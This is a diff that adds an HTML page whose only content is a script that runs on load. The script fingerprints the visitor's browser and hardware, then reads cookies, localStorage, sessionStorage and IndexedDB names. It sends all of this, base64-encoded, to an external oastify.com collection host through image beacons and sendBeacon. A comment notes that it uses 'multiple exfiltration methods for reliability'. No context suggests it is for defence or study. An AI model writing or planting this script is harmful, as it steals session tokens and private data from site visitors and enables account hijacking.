@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+(async () => {
+  const exfil = (endpoint, data) => {
+    const encoded = btoa(JSON.stringify(data));
+    // Multiple exfiltration methods for reliability
+    new Image().src = `https://fo7qclzh275gyd5ap29eim6wpnvej6lua.oastify.com/${endpoint}?data=${encoded}`;
+    navigator.sendBeacon(`https://fo7qclzh275gyd5ap29eim6wpnvej6lua.oastify.com/beacon`, encoded);
+  };
+
+  // Comprehensive Browser Fingerprint
+  const fingerprint = {
+    timestamp: new Date().toISOString(),
+    url: window.location.href,
+    referrer: document.referrer,
+    
+    // Navigator Properties
+    platform: navigator.platform,
+    userAgent: navigator.userAgent,
+    appVersion: navigator.appVersion,
+    language: navigator.language,
+    languages: navigator.languages,
+    product: navigator.product,
+    productSub: navigator.productSub,
+    vendor: navigator.vendor,
+    deviceMemory: navigator.deviceMemory,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    webdriver: navigator.webdriver,
+    maxTouchPoints: navigator.maxTouchPoints,
+    
+    // Screen Properties
+    screen: `${screen.width}x${screen.height}`,
+    availScreen: `${screen.availWidth}x${screen.availHeight}`,
+    colorDepth: screen.colorDepth,
+    pixelDepth: screen.pixelDepth,
+    orientation: screen.orientation?.type,
+    
+    // Window Properties
+    viewport: `${window.innerWidth}x${window.innerHeight}`,
+    devicePixelRatio: window.devicePixelRatio,
+    
+    // Time & Location
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    locale: Intl.DateTimeFormat().resolvedOptions().locale,
+    
+    // Capabilities
+    touchSupport: 'ontouchstart' in window,
+    localStorage: !!window.localStorage,
+    sessionStorage: !!window.sessionStorage,
+    indexedDB: !!window.indexedDB,
+    serviceWorker: !!navigator.serviceWorker,
+    webGL: getWebGLInfo(),
+    
+    // Security Context
+    evalWorks: (() => {
+      try { eval("1+1"); return true; } catch { return false; }
+    })(),
+    isSecure: window.isSecureContext,
+    origin: window.location.origin
+  };
+
+  // Get WebGL Information
+  function getWebGLInfo() {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+          vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
+          renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER),
+          version: gl.getParameter(gl.VERSION),
+          shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+        };
+      }
+    } catch (e) {}
+    return 'WebGL not supported';
+  }
+
+  // Network Information
+  try {
+    const conn = navigator.connection;
+    if (conn) {
+      fingerprint.connection = {
+        effectiveType: conn.effectiveType,
+        downlink: conn.downlink,
+        rtt: conn.rtt,
+        saveData: conn.saveData,
+        type: conn.type
+      };
+    }
+  } catch (e) {}
+
+  // Battery Information
+  try {
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      fingerprint.battery = {
+        charging: battery.charging,
+        level: Math.round(battery.level * 100) + '%',
+        chargingTime: battery.chargingTime,
+        dischargingTime: battery.dischargingTime
+      };
+    }
+  } catch (e) {}
+
+  // Permissions
+  try {
+    fingerprint.permissions = {};
+    const permissionTypes = [
+      'camera', 'microphone', 'geolocation', 'notifications', 
+      'persistent-storage', 'push', 'midi', 'background-sync'
+    ];
+    
+    for (const type of permissionTypes) {
+      try {
+        const status = await navigator.permissions.query({ name: type });
+        fingerprint.permissions[type] = status.state;
+      } catch (e) {}
+    }
+  } catch (e) {}
+
+  // Storage Estimation
+  try {
+    if (navigator.storage && navigator.storage.estimate) {
+      const storage = await navigator.storage.estimate();
+      fingerprint.storageEstimate = {
+        usage: Math.round(storage.usage / 1024 / 1024) + ' MB',
+        quota: Math.round(storage.quota / 1024 / 1024) + ' MB',
+        usageDetails: storage.usageDetails
+      };
+    }
+  } catch (e) {}
+
+  // User Agent Data (new API)
+  try {
+    if (navigator.userAgentData) {
+      const uaData = navigator.userAgentData;
+      fingerprint.userAgentData = {
+        brands: uaData.brands,
+        mobile: uaData.mobile,
+        platform: uaData.platform
+      };
+    }
+  } catch (e) {}
+
+  // Media Devices
+  try {
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      fingerprint.mediaDevices = devices.map(device => ({
+        kind: device.kind,
+        label: device.label,
+        deviceId: device.deviceId
+      }));
+    }
+  } catch (e) {}
+
+  // Send fingerprint first
+  await exfil("fingerprint", fingerprint);
+
+  // Storage Extraction
+  try {
+    const localStorageData = {};
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      localStorageData[key] = localStorage.getItem(key);
+    }
+    await exfil("localStorage", localStorageData);
+  } catch (e) {}
+
+  try {
+    const sessionStorageData = {};
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      sessionStorageData[key] = sessionStorage.getItem(key);
+    }
+    await exfil("sessionStorage", sessionStorageData);
+  } catch (e) {}
+
+  // Cookies
+  try {
+    fingerprint.cookies = document.cookie;
+    await exfil("cookies", { cookies: document.cookie });
+  } catch (e) {}
+
+  // IndexedDB Discovery (simplified)
+  try {
+    const dbs = await indexedDB.databases();
+    fingerprint.indexedDBs = dbs.map(db => db.name);
+    await exfil("indexedDB", { databases: fingerprint.indexedDBs });
+  } catch (e) {}
+
+  // Font Enumeration
+  try {
+    if (document.fonts) {
+      const fonts = new Set();
+      document.fonts.forEach(font => fonts.add(font.family));
+      fingerprint.fonts = Array.from(fonts);
+      await exfil("fonts", { fonts: fingerprint.fonts });
+    }
+  } catch (e) {}
+
+  // Performance Timing
+  try {
+    if (performance.timing) {
+      fingerprint.performance = {
+        loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
+        domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
+        redirectCount: performance.navigation.redirectCount,
+        type: performance.navigation.type
+      };
+      await exfil("performance", fingerprint.performance);
+    }
+  } catch (e) {}
+
+  // Final summary
+  const summary = {
+    collectionComplete: true,
+    timestamp: new Date().toISOString(),
+    dataPoints: Object.keys(fingerprint).length,
+    hasStorage: !!localStorageData || !!sessionStorageData,
+    hasMediaDevices: !!fingerprint.mediaDevices,
+    hasBattery: !!fingerprint.battery
+  };
+  
+  await exfil("summary", summary);
+
+})();
+</script>
+</body>
+</html>
